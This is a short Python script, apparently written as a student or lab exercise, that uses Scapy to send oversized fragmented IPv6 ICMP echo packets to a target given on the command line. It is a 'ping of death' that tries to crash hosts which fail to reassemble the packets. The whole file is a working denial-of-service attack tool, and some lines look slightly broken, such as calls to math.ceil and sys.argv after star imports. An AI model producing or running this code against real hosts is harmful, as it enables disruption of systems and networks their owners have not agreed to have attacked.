#!/usr/bin/python

# Jack Cardwell
# February 25, 2018

# pingOfDeath.py sends a fragmented packet that is over the maximum legal length, which may not
# be pieced together properly again
from scapy.all import *
from sys import *
from math import *
# define the main program
def ping():

    # get the command line arguments
    if len(sys.argv) < 4:
        print("Error: Please enter a sufficient number of packets")
        print("Usage: ./pingOfDeath.py [TGT] [PKT_LEN] [FRAG_PACKET_LEN]")
        exit(2) # exit with an error

    tgt = sys.argv[1]
    pktLen = int(sys.argv[2])
    fragPktLen = int(sys.argv[3])

    numPackets = int(math.ceil(float(pktLen)/float(fragPktLen)))
    offset = 0
    # first create the IPv6 header
    ip = IPv6(dst = tgt)

    # go through all of the packets that need to be sent
    for i in range(0, numPackets):
        frag = IPv6ExtHdrFragment()

        # set the length
        frag.offset = (i * fragPktLen) / 8

        # check to see if this is the last packet
        if i == numPackets - 1:
            # set the more fragments flag to 0
            frag.m = 0
            ip.plen = 8 + pktLen - ((numPackets-1) * fragPktLen)
            fragPktLen = pktLen - ((numPackets-1) * fragPktLen)
        else:
            # otherwise set the more fragments flag to 1
            frag.m = 1

        # the first packet needs an ICMP header, while the others do not
        if i == 0:
            icmp = ICMPv6EchoRequest()
            data = "J"*fragPktLen   # will be the maximum fragment length until the last packet
            frag.nh = 58
            pkt = (ip/frag/icmp/Raw(load=data))
        else:
            pkt = (ip/frag/Raw(load=data))

        # send the packet
        send(pkt)

ping()
